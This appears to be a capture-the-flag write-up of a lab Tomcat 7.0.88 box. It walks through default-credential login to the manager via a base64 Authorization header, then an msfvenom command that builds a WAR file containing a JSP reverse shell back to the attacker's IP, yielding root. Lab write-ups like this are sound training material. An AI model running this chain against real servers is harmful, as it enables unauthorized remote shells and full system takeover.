
## Enumeration
- nmap scan shows that port 8080 is open with Apache Tomcat/7.0.88 running on it
- we look through the webpage
- open server status and we put in admin admin and it works
- then i look at the response in burpsuit and it has a username tomcat and password s3cret
- I found authorization tag in the html post requests
- it had base64 encoding of admin:admin, so i encoded tomcat:s3cret and input it and now i have access to the manager
- i found a upload file and deploy button

## Exploitation
- first thing that comes to mind is to create a shell file to connect back to my machine to get a reverse shell
- it needs war files so we can run msfvenom to make one `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_tun0_ip> LPORT=4444 -f war -o shell.war`
-  Then open website/shell, and boom you have a reverse shell (this gets you user and root.txt)